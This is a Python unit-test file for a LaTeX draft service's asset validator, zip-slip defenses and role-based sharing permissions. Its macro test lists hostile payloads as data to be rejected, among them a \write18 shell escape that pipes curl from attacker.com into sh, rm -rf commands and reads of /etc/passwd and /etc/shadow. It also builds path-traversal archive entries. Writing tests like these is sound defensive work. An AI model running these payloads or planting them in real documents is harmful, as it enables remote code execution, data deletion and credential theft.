"""Unit tests for Multi-layer Zip-Slip defense, Asset Security, and Sharing RBAC."""

import io
import stat
import zipfile
from uuid import uuid4

import pytest
from core.domain.entities.draft import (
    DraftCollaborator,
    DraftRole,
    DraftShareSettings,
    can_call_costly_ai,
    can_compile_draft,
    can_edit_draft_source,
    can_manage_draft_assets,
    can_manage_draft_share,
)
from core.domain.exceptions import (
    AssetQuotaExceededError,
    MaliciousAssetContentError,
    ZipSlipSecurityError,
)
from core.services.draft_asset_security import DraftAssetSecurityValidator


@pytest.fixture
def validator() -> DraftAssetSecurityValidator:
    return DraftAssetSecurityValidator()


def create_zip_archive(files: dict[str, bytes], symlinks: list[str] | None = None) -> bytes:
    """Helper to synthesize in-memory zip archives with optional symlinks."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, data in files.items():
            zf.writestr(name, data)

        if symlinks:
            for link_name in symlinks:
                info = zipfile.ZipInfo(link_name)
                # Set symlink mode in upper 16 bits of external_attr
                info.external_attr = (stat.S_IFLNK | 0o777) << 16
                zf.writestr(info, "target_file.png")

    return buf.getvalue()


# ==============================================================================
# 1. Single Asset Validation Tests
# ==============================================================================


def test_valid_assets_accepted(validator: DraftAssetSecurityValidator) -> None:
    """Verify standard supported academic assets (.png, .pdf, .cls, .sty, .bib)."""
    png_content = b"\x89PNG\r\n\x1a\n" + b"\x00" * 20
    pdf_content = b"%PDF-1.5\n%Header"
    cls_content = b"\\NeedsTeXFormat{LaTeX2e}\n\\ProvidesClass{customart}\n\\LoadClass{article}"
    sty_content = b"\\NeedsTeXFormat{LaTeX2e}\n\\ProvidesPackage{verischolar}\n"
    bib_content = b"@article{vaswani2017,\n  author = {Vaswani, A.},\n  title = {Attention}\n}"

    assert validator.validate_single_asset("fig1.png", png_content) == ".png"
    assert validator.validate_single_asset("doc.pdf", pdf_content) == ".pdf"
    assert validator.validate_single_asset("paper.cls", cls_content) == ".cls"
    assert validator.validate_single_asset("pkg.sty", sty_content) == ".sty"
    assert validator.validate_single_asset("refs.bib", bib_content) == ".bib"


def test_disallowed_extensions_rejected(validator: DraftAssetSecurityValidator) -> None:
    """Verify unauthorized file formats are blocked."""
    for filename in ("script.sh", "server.py", "malware.exe", "index.html", "payload.php"):
        with pytest.raises(MaliciousAssetContentError) as exc_info:
            validator.validate_single_asset(filename, b"echo hello")
        assert "not permitted" in str(exc_info.value)


def test_dangerous_latex_macros_rejected(validator: DraftAssetSecurityValidator) -> None:
    """Verify shell escapes and unauthorized file writes in .cls/.sty are rejected."""
    bad_snippets = [
        b"\\write18{curl -s http://attacker.com/malware | sh}",
        b"\\immediate\\write18{rm -rf /tmp/data}",
        b"\\input{/etc/passwd}",
        b"\\include{../../../../etc/shadow}",
        b"\\openout15=exploit.sh",
        b"\\newwrite\\outfile",
        b"\\sys_shell:nn {rm -rf *}",
    ]
    for bad in bad_snippets:
        with pytest.raises(MaliciousAssetContentError) as exc_info:
            validator.validate_single_asset("macros.sty", bad)
        assert "Dangerous macro or shell escape" in str(exc_info.value)


def test_null_bytes_in_text_rejected(validator: DraftAssetSecurityValidator) -> None:
    """Verify null bytes in text assets are caught and rejected."""
    with pytest.raises(MaliciousAssetContentError) as exc_info:
        validator.validate_single_asset("refs.bib", b"@article{a,\x00 title={test}}")
    assert "Binary null bytes" in str(exc_info.value)


def test_invalid_image_magic_header_rejected(validator: DraftAssetSecurityValidator) -> None:
    """Verify fake PNG files without PNG magic bytes are rejected."""
    with pytest.raises(MaliciousAssetContentError) as exc_info:
        validator.validate_single_asset("figure.png", b"GIF89a fake image header")
    assert "PNG image header" in str(exc_info.value)


# ==============================================================================
# 2. Multi-layer Zip-Slip & Archive Defense Tests
# ==============================================================================


def test_zip_slip_path_traversal_blocked(validator: DraftAssetSecurityValidator) -> None:
    """Verify directory traversal ('..') in archive filenames is strictly blocked."""
    zip_bytes = create_zip_archive(
        {
            "../../etc/passwd.png": b"\x89PNG\r\n\x1a\n" + b"\x00" * 10,
        }
    )
    with pytest.raises(ZipSlipSecurityError) as exc_info:
        validator.safe_extract_zip_assets(zip_bytes)
    assert "Path traversal" in str(exc_info.value)


def test_zip_slip_absolute_path_blocked(validator: DraftAssetSecurityValidator) -> None:
    """Verify absolute paths (/root/..., C:\\...) are strictly blocked."""
    zip_bytes = create_zip_archive(
        {
            "/var/www/exploit.png": b"\x89PNG\r\n\x1a\n" + b"\x00" * 10,
        }
    )
    with pytest.raises(ZipSlipSecurityError) as exc_info:
        validator.safe_extract_zip_assets(zip_bytes)
    assert "Absolute paths forbidden" in str(exc_info.value)


def test_zip_slip_windows_drive_blocked(validator: DraftAssetSecurityValidator) -> None:
    """Verify Windows drive letter paths (C:\\...) are strictly blocked."""
    zip_bytes = create_zip_archive(
        {
            "C:/Windows/System32/calc.png": b"\x89PNG\r\n\x1a\n" + b"\x00" * 10,
        }
    )
    with pytest.raises(ZipSlipSecurityError) as exc_info:
        validator.safe_extract_zip_assets(zip_bytes)
    assert "Drive-relative absolute paths forbidden" in str(exc_info.value)


def test_zip_symlink_blocked(validator: DraftAssetSecurityValidator) -> None:
    """Verify symbolic link entries inside archives are detected and rejected."""
    zip_bytes = create_zip_archive(
        files={"valid.png": b"\x89PNG\r\n\x1a\n" + b"\x00" * 10},
        symlinks=["symlink_to_source.png"],
    )
    with pytest.raises(ZipSlipSecurityError) as exc_info:
        validator.safe_extract_zip_assets(zip_bytes)
    assert "Symlinks are strictly prohibited" in str(exc_info.value)


def test_zip_bomb_file_count_limit(validator: DraftAssetSecurityValidator) -> None:
    """Verify archives with excessive file count are rejected."""
    excessive_files = {f"file_{i}.png": b"\x89PNG\r\n\x1a\n" + b"\x00" * 10 for i in range(55)}
    zip_bytes = create_zip_archive(excessive_files)
    with pytest.raises(AssetQuotaExceededError) as exc_info:
        validator.safe_extract_zip_assets(zip_bytes)
    assert "exceeding limit of 50" in str(exc_info.value)


def test_safe_zip_extraction_in_memory(validator: DraftAssetSecurityValidator) -> None:
    """Verify valid multi-asset zip extracts clean leaf names into memory."""
    png_data = b"\x89PNG\r\n\x1a\n" + b"\x00" * 10
    bib_data = b"@article{attention,\n  author = {Vaswani},\n  title = {Attention}\n}"
    sty_data = b"\\ProvidesPackage{mystyle}\n"

    zip_bytes = create_zip_archive(
        {
            "assets/images/fig1.png": png_data,
            "assets/bibs/refs.bib": bib_data,
            "mystyle.sty": sty_data,
        }
    )

    extracted = validator.safe_extract_zip_assets(zip_bytes)
    assert len(extracted) == 3

    filenames = [name for name, _ in extracted]
    assert "fig1.png" in filenames
    assert "refs.bib" in filenames
    assert "mystyle.sty" in filenames


# ==============================================================================
# 3. Sharing RBAC & Privacy Isolation Tests
# ==============================================================================


def test_draft_role_resolution_hierarchy() -> None:
    """Verify role resolution logic across owner, direct collaborators, and public link."""
    owner_id = uuid4()
    editor_id = uuid4()
    commenter_id = uuid4()
    viewer_id = uuid4()
    random_user_id = uuid4()

    settings = DraftShareSettings(
        draft_id=uuid4(),
        share_token="token_xyz",
        share_url="/shared/drafts/test",
        permission="viewer",
        allow_public_link=False,
        collaborators=[
            DraftCollaborator(email="editor@example.com", permission="editor", user_id=editor_id),
            DraftCollaborator(
                email="commenter@example.com", permission="commenter", user_id=commenter_id
            ),
            DraftCollaborator(email="viewer@example.com", permission="viewer", user_id=viewer_id),
        ],
    )

    # 1. Owner resolution
    assert settings.resolve_role(owner_id, owner_id) == DraftRole.OWNER

    # 2. Collaborators by UUID
    assert settings.resolve_role(owner_id, editor_id) == DraftRole.EDITOR
    assert settings.resolve_role(owner_id, commenter_id) == DraftRole.COMMENTER
    assert settings.resolve_role(owner_id, viewer_id) == DraftRole.VIEWER

    # 3. Collaborators by email
    assert (
        settings.resolve_role(owner_id, uuid4(), user_email="Editor@example.com")
        == DraftRole.EDITOR
    )
    assert (
        settings.resolve_role(owner_id, uuid4(), user_email="COMMENTER@example.COM")
        == DraftRole.COMMENTER
    )

    # 4. Unknown user with public link disabled
    assert settings.resolve_role(owner_id, random_user_id) is None

    # 5. Unknown user with public link enabled
    settings.allow_public_link = True
    settings.permission = "viewer"
    assert settings.resolve_role(owner_id, random_user_id) == DraftRole.VIEWER


def test_draft_role_permission_matrix() -> None:
    """Verify strict prohibition on compile, AI assist, and source edits for viewer/commenter."""
    # Owner & Editor rights
    for role in (DraftRole.OWNER, DraftRole.EDITOR):
        assert can_edit_draft_source(role) is True
        assert can_compile_draft(role) is True
        assert can_call_costly_ai(role) is True
        assert can_manage_draft_assets(role) is True

    # Viewer & Commenter STRICT PROHIBITIONS
    for restricted_role in (DraftRole.VIEWER, DraftRole.COMMENTER):
        assert can_edit_draft_source(restricted_role) is False
        assert can_compile_draft(restricted_role) is False
        assert can_call_costly_ai(restricted_role) is False
        assert can_manage_draft_assets(restricted_role) is False

    # Share management is strictly Owner-only
    assert can_manage_draft_share(DraftRole.OWNER) is True
    assert can_manage_draft_share(DraftRole.EDITOR) is False
    assert can_manage_draft_share(DraftRole.VIEWER) is False
